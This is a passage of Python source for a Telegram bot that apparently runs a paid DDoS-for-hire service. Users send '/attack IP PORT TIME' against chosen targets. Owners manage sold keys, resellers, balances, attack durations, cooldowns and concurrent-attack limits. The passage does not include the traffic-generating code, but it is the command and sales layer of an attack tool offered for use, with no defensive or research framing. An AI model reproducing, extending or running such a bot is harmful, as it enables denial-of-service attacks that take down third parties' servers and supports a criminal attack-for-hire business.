    # /delexpkey
    elif cmd=='delexpkey':
        ex=[k for k,v in codes.items() if v.get('expires',0)<time.time()]
        for k in ex: del codes[k]
        save("codes.json",codes); bot.reply_to(m,f"✅ Deleted {len(ex)} expired keys")

@bot.message_handler(commands=['start','help','verify','confirm_join','activate'])
def user_commands(m):
    uid=m.from_user.id; cid=m.chat.id; ct=m.chat.type; cmd=m.text.split()[0][1:]
    p=m.text.split()
    
    if cmd=='start':
        if is_owner(uid): bot.reply_to(m,"🔥 OWNER BOT\n/allcommands for all commands")
        elif ct=='private':
            if is_banned(uid): bot.reply_to(m,"🚫 Banned!")
            elif has_key(uid): bot.reply_to(m,f"🔥 KEY ACTIVE!\n/attack IP PORT TIME\n/status\n/activate KEY")
            else: bot.reply_to(m,f"🔑 /activate KEY")
        else: bot.reply_to(m,f"🔥 GROUP {'APPROVED' if is_approved(cid) else 'NOT APPROVED'}\n/attack IP PORT TIME")
    elif cmd=='verify':
        if ct!='private': bot.reply_to(m,"Use in private")
        else: bot.reply_to(m,f"🔐 Join: {REQUIRED_CHANNEL}\nThen /confirm_join")
    elif cmd=='confirm_join':
        verify_channel(uid); bot.reply_to(m,"✅ Verified!")
    elif cmd=='activate':
        if ct!='private': return
        bot.reply_to(m,"✅ Activated!" if len(p)==2 and use_key(uid,p[1].upper()) else "❌ Invalid key")
    elif cmd=='help':
        if is_owner(uid): bot.reply_to(m,"/allcommands - All commands")
        else: bot.reply_to(m,f"/attack IP PORT TIME\n/status\n/running\n/activate KEY\n/verify")

# ALLCOMMANDS HANDLER
@bot.message_handler(commands=['allcommands'])
def allcommands_cmd(m):
    cmds="""🔥 ALL COMMANDS 🔥

📌 OWNER:
/extendkey <key/id> <time> - Extend key
/extendallkey <time> - Extend all keys
/keyusers <key> - Show key users
/down <key/id> <time> - Reduce time
/tban <id> <time> [reason] - Temp ban
/add_reseller <id> - Add reseller
/remove_reseller <id> - Remove reseller
/block_reseller <id> - Block reseller
/unblock_reseller <id> - Unblock reseller
/all_resellers - List resellers
/saldoadd <id> <amt> - Add balance
/saldoremove <id> <amt> - Remove balance
/saldo <id> - Check balance
/setgrp <gid> <setting> <val> - Config group
/broadcast <msg> - To all users
/broadcastreseller <msg> - To resellers
/broadcastpaid <msg> - To paid users
/maintenance <msg> - Maintenance ON
/ok - Maintenance OFF
/delexpkey - Delete expired keys
/setcooldowngroup <gid> <sec> - Group cooldown
/setcooldownuser <uid> <sec> - User cooldown
/setmaxtimeuser <uid> <sec> - User max time
/setglobalcooldown <sec> - Global cooldown
/setmaxtimegroup <gid> <sec> - Group max time
/setmaxcongroup <gid> <num> - Group concurrent
/setmaxtimeattackperpersongroup <gid> <num> - Per-person limit
/setonofffeedback on/off - Feedback toggle
/onoffchannelverify on/off - Channel verify toggle
/ban <id> - Ban user
/unban <id> - Unban user
/addport <port> - Block port
/removeport <port> - Unblock port
/addip <ip> - Block IP
/removeip <ip> - Unblock IP
/on - Bot ON
/off - Bot OFF
/approve <gid> - Approve group
/revoke <gid> - Revoke group
/groups - List groups
/gen <name> <time> [max] - Generate key
/keys - List keys
/allkeys - All keys details
/delkey <key> - Delete key
/delkeys confirm - Delete all keys
/stats - Bot stats
/stop - Stop all attacks
/myapi - API info
/checkuser <id> - Check user
/resetcooldown <id> - Reset cooldown
/resetuserattack <id> <gid> - Reset attack limit
/serverinfo - Server status
/status - Bot status
/running - Active attacks

📌 USER:
/attack IP PORT TIME - Start attack
/status - Bot status
/running - Active attacks
/activate KEY - Activate key
/verify - Channel verify
/balance - Check balance (reseller)

📌 TIME OPTIONS:
30min, 1hr, 2hr, 5hr, 12hr, 1d, 3d, 7d, 15d, 30d, etc."""
    bot.reply_to(m,cmds)

print("✅ BOT STARTED - ALL COMMANDS FIXED!")
print("✅ NEW: /onoffchannelverify - Toggle channel verification ON/OFF")
bot.infinity_polling()
